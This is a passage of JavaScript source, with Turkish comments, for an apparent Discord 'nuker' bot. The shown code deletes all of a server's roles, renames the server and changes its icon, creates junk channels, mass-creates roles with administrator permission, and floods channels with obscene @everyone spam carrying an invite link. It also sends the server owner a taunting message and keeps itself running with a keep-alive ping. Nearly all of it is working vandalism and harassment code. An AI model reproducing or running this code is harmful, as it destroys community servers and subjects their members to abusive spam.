      .createChannel("SONSUZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("AFFETMEYİZ", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("Rias Siker", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });
    await msg.guild
      .createChannel("▬▬▬▬▬▬▬", {
        type: "voice"
      })
      .then(chan => {
        chan.setUserLimit("1");
      });










    await msg.guild.setIcon("https://i.hizliresim.com/FCFoV2.png"); //SUNUCUNUN RESMINI DEGISTIRIR HIZI RESIM SUTESINDEN UPLOAD EDEBILIRSINIZ
    await msg.guild.setName("Rias sikti attıxd"); //SUNUCUNUN ISMINI DEGISTIRIR
    await msg.guild.roles.forEach(roles => roles.delete()); //BOTUN SIZE BILDIGI BÜTÜN ROLLER SILINIR (BOTUN ROLUNUN ALTINDAKILER)
    await client.user.setAvatar("https://i.hizliresim.com/FCFoV2.png"); //BOTUN RESMINI DEGISTIRIR HIZLI RESIM SITESINDEN UPLOAD EDEBILIRSINIZ
    await client.user.setUsername("RİAS SİKTİ <3"); //BOTUN ISMİNİ DEGISTIRIR
    await msg.guild.owner.send(
      "**Sunucunun Rias Tarafından Çökertilmiştir. Çevrimiçine dökülür çeten xD**"
    ); //SUNUCUNUN KURUCUSUNA DMDEN GÖNDERİLEN MESAJ
  }
});

client.on("message", msg => {
  if (msg.content === "+rolspam") {
    //ROL SPAM YAPAR
    msg.delete();
    msg.guild.createRole({
      name: "Rias Siker",
      color: "A93D3D",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
   });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "E000FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
   });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FFAE00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FFD500",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FFFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "E0FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "C1FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "93FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "74FF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "3EFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "0CFF00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "00FF2E",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "00FF6C",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "00FFA6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "00FFD4",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "00FFFB",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "00C9FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "009BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "006CFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "003AFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "001BFF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "1F00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "4200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "7C00FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "A200FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "C500FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "E000FF",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias& Siker",
      color: "FF00F3",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF00B6",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF0097",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF005D",
      permissions: ["ADMINISTRATOR"]
    });
                    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF0032",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "C22F2F",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "E12020",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF0000",
      permissions: ["ADMINISTRATOR"]
    });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
   });
    msg.guild.createRole({
      name: "Rias Siker",
      color: "FF3E00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FF4D00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FF6C00",
      permissions: ["ADMINISTRATOR"]
    });
                msg.guild.createRole({
      name: "Rias Siker",
      color: "FF9300",
      permissions: ["ADMINISTRATOR"]

   });
  }
});

const http = require("http");
const express = require("express");
const app = express();
function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if (new Date().getTime() - start > milliseconds) {
      //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
      break;
    }
  }
}
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`); //// 7-24 AÇIK KALMASINI SAĞLAYAN KOMUT BİRŞEY DEĞİŞTİRMEYİN
}, 3000);

client.on("message", msg => {
  if (msg.content === "+ayardım") {
    //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
    msg.channel.send(
      "**YARRAMI YE**"
    );
  }
});

client.on("message", msg => {
  if (msg.content === "+spam") {
    //KOMUTU YAZDIGINIZ KANALA SPAM ATAR
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"
    );
    msg.channel.send(
      "**BU SUNUCU RİAS TARAFINDAN SİKİLMİŞTİR! https://discord.gg/w5gWrAuFTG @everyone @here **"

         );
     msg.channel.send(
